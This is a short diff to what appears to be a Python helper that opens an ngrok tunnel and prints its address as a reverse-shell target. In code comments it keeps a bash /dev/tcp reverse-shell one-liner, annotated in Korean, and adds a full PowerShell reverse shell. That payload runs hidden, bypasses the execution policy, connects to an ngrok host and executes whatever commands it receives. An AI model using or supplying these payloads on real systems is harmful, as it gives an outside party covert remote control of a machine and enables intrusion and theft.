@@ -28,7 +28,13 @@ def main():
         if m:
             print("ngrok Public Address :", m.group(1))
             print("Reverse Shell bash tcp socket : /dev/tcp/" + "/".join(m.group(1).split(":")))
-            # ex) bash -i >&(표준출력 1, 표준에러 2 소켓으로 보냄) /dev/tcp/0.tcp.jp.ngrok.io/12707 0>&1 (표준입력 0을 표준 출력 1이 가는 곳으로 보내기)
+            
+            # Linux
+            # bash -i >&(표준출력 1, 표준에러 2 소켓으로 보냄) /dev/tcp/0.tcp.jp.ngrok.io/12707 0>&1 (표준입력 0을 표준 출력 1이 가는 곳으로 보내기)
+
+            # Window
+            # powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('0.tcp.jp.ngrok.io',12707);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()" 
+
             print("ngrok Dashboard : 127.0.0.1:4040")
             break
 
